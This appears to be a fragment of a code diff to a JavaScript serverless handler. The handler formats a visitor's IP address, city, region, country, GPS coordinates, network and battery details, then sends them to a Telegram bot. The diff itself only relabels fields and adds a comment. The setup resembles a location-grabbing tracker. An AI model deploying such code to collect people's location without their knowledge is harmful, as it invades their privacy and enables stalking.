@@ -22,20 +22,22 @@ export default async (req, res) => {
     `📶 **Network:**\n` +
     `- Type: ${d.networkType}\n` +
     `- Speed: ${d.networkSpeed}\n` +
-    `- Latency (RTT): ${d.latency}\n` +
+    `- Latency: ${d.latency}\n` +
     `- Data Saver: ${d.dataSaver}\n\n` +
 
-    `📍 **Location & IP:**\n` +
+    `📍 **IP Info:**\n` +
     `- IP: ${d.ip}\n` +
     `- City: ${d.location.city}\n` +
     `- Region: ${d.location.region}\n` +
     `- Country: ${d.location.country}\n` +
     `- GPS: ${d.gps}\n\n` +
+    `"_Note: IP-based location may not be accurate._"\n\n` +
 
     `🔋 **Battery:**\n` +
     `- Level: ${d.batteryLevel}\n` +
-    `- Charging: ${d.charging}\n`;
+    `- Charging: ${d.charging}`;
 
+    // Send message to Telegram
     await fetch(
       `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
       {
